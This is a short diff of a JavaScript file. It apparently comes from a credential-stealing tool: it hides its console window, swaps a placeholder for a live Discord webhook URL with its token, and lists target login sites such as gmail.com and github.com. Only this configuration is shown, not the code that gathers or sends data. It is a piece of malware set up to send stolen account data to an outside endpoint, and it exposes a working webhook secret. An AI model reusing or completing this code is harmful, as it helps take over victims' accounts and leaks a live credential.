@@ -15,7 +15,7 @@ const hideconsole = require('node-hide-console-window');
 
 
 
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %webhookstring% = "https://discord.com/api/webhooks/1098057740192067646/a5bHCkKzC7NzPZx-opK_5pr_H3rYVQuLvpYNU_9YHiGjr8xjwEWz779Vd1FkWXhf77HU"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
 
